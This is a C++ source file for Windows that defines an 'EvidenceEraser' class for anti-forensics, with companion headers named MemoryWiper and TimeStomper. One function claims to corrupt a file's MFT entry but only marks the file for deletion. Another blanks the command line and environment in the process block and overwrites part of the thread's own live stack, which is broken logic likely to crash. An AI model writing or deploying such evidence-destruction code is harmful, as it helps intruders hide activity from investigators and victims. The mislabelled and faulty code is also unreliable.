#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include "MemoryWiper.h"
#include "TimeStomper.h"

#pragma comment(lib, "ntdll.lib")

BOOL EvidenceEraser::CorruptMftEntry(LPCWSTR filePath) {
    HANDLE hFile = CreateFileW(filePath, GENERIC_READ | GENERIC_WRITE, 
                              0, NULL, OPEN_EXISTING, 
                              FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    BY_HANDLE_FILE_INFORMATION fileInfo;
    GetFileInformationByHandle(hFile, &fileInfo);

    FILE_DISPOSITION_INFO dispInfo = { TRUE };
    SetFileInformationByHandle(hFile, FileDispositionInfo, &dispInfo, sizeof(dispInfo));
    
    CloseHandle(hFile);
    return TRUE;
}

VOID EvidenceEraser::CleanProcessArtifacts() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    pPeb->ProcessParameters->CommandLine.Buffer = NULL;
    pPeb->ProcessParameters->Environment = NULL;
    
    CONTEXT ctx;
    RtlCaptureContext(&ctx);
    MemoryWiper::SecureErase((PVOID)ctx.Rsp, 0x2000);
}
